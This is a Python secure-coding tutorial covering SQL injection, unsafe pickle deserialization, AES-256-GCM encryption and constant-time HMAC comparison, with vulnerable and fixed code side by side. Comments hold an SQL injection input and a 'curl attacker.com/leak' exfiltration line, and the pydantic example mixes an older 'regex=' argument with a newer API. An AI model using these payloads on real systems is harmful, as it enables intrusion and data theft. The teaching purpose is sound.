# 🐍 Module 06: Python Secure Coding & Cryptography

## 1. SQL Injection Prevention & Parameterization

SQL injection remains one of the top OWASP vulnerabilities in data engineering pipelines where dynamic table names, partition keys, or user filters are concatenated into SQL queries.

```python
# ❌ VULNERABLE: String formatting creates fatal SQL injection vector
def get_user_bad(cursor, user_input_email):
    query = f"SELECT id, balance FROM users WHERE email = '{user_input_email}'"
    cursor.execute(query) # Attacker input: "admin@corp.com' OR '1'='1"

# ✅ SECURE: Strict Parameterization binds input as literal data, never SQL grammar
def get_user_good(cursor, user_input_email):
    query = "SELECT id, balance FROM users WHERE email = %s"
    cursor.execute(query, (user_input_email,))
```

### Safe Dynamic Table & Column Identification:
When table names or column names must be dynamic, never interpolate raw strings. Use engine-specific quotation identifiers or whitelist mapping:
```python
from psycopg2 import sql

def query_tenant_table(cursor, table_name, tenant_id):
    # Whitelist or escape identifiers safely
    query = sql.SQL("SELECT * FROM {} WHERE tenant_id = %s").format(
        sql.Identifier(table_name)
    )
    cursor.execute(query, (tenant_id,))
```

---

## 2. Insecure Deserialization: The `pickle` Remote Code Execution Trap

Python's built-in `pickle` module executes arbitrary bytecode during deserialization. **Never unpickle data received over network sockets, message queues (Kafka, Celery), or external files.**

```python
# ❌ VULNERABLE: Arbitrary code execution via malicious pickle payload
import pickle
data = pickle.loads(untrusted_network_bytes) # Executes os.system("curl attacker.com/leak")

# ✅ SECURE: Enforce structured, type-validated serialization
from pydantic import BaseModel, Field

class PipelineEvent(BaseModel):
    event_id: str = Field(..., regex="^[A-Z0-9_-]{10,50}$")
    amount: float = Field(..., ge=0.0)
    customer_id: int

# Safe deserialization with strict schema validation
event = PipelineEvent.model_validate_json(untrusted_json_string)
```

---

## 3. Cryptographic Primitives: Authenticated Encryption with AES-256-GCM

Modern cryptography requires **Authenticated Encryption with Associated Data (AEAD)** to guarantee both confidentiality (secrecy) and integrity (tamper-proofing).

```python
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def encrypt_sensitive_payload(plaintext_bytes: bytes, associated_metadata: bytes, key: bytes) -> tuple[bytes, bytes]:
    """
    Encrypts data using AES-256-GCM AEAD mode.
    key must be cryptographically random 256 bits (32 bytes).
    """
    aesgcm = AESGCM(key)
    # Generate 96-bit unique nonce (NEVER reuse a nonce with the same key!)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext_bytes, associated_metadata)
    return nonce, ciphertext

def decrypt_sensitive_payload(nonce: bytes, ciphertext: bytes, associated_metadata: bytes, key: bytes) -> bytes:
    """
    Decrypts and validates the authentication tag. Raises InvalidTag exception if tampered.
    """
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, associated_metadata)
```

### Constant-Time Verification to Prevent Timing Side-Channel Attacks:
```python
import hmac

# ❌ VULNERABLE: Standard equality operator (==) terminates early on first mismatched byte
if user_supplied_signature == actual_hmac_signature: ...

# ✅ SECURE: Constant-time comparison takes identical time regardless of mismatched bytes
if hmac.compare_digest(user_supplied_signature, actual_hmac_signature): ...
```
